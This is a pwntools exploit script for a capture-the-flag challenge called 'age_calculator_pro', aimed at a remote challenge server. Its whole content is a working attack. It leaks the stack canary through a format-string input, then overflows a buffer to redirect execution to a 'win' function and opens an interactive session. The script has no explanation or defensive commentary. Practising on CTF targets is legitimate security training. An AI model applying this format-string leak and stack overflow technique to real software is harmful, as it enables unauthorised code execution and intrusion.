from pwn import *

exe = ELF("./age_calculator_pro_patched")

context.binary = exe

HOST = "agecalculatorpro.challs.olicyber.it"
PORT = 38103

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def leak_canary(r):
    r.sendlineafter(b"?", b"%17$p")

    canary = int(r.recvuntil(b",").decode()[:-1], 16)
    log.success(f"LEAKED CANARY {hex(canary)}")

    return canary

def ret2win(r, canary):
    r.sendlineafter(b"?", b"a" * 0x48 + pack(canary) + b"a" * 8 + pack(exe.symbols.win))
    
def main():
    r = conn()

    canary = leak_canary(r)
    ret2win(r, canary)

    r.interactive()

if __name__ == "__main__":
    main()
